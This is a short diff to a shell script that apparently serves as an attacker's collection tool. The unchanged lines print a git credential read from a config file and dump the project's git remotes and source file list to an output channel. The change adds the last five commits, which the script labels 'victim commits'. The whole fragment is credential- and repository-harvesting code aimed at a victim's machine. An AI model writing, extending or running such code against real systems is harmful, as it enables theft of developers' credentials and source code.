@@ -58,10 +58,13 @@ if [ -f "$GITCFG" ]; then
   P "ugit credential: $CRED"
 fi
 P ''
-P "git remote:"
+P '--- git remote -v ---'
 cd "$PROJDIR" 2>/dev/null && git remote -v 2>/dev/null >&3 || P 'no remote'
 P ''
-P "source files:"
+P '--- git log (victim commits) ---'
+cd "$PROJDIR" 2>/dev/null && git log --oneline -5 2>/dev/null >&3 || P 'no log'
+P ''
+P '--- source file listing ---'
 find "$PROJDIR/src/" -type f 2>/dev/null >&3 || P 'no src/'
 P ''
 
